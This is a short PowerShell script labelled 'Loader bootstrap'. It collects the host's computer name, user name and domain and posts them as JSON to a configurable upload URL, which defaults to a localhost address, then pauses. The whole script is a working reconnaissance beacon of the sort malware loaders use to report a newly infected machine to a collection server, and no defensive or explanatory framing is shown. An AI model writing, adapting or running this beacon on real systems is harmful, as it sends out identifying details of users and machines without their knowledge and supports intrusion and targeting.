<# Loader bootstrap #>
[CmdletBinding()]
param(
    [string]$TargetUrl = "http://127.0.0.1:80/upload"
)
$ProfileData = [ordered]@{ ComputerName = $env:COMPUTERNAME; UserName = $env:USERNAME; Domain = $env:USERDOMAIN }
Invoke-RestMethod -Uri $TargetUrl -Method Post -Body ($ProfileData | ConvertTo-Json) -ContentType "application/json"
Start-Sleep -Seconds 24
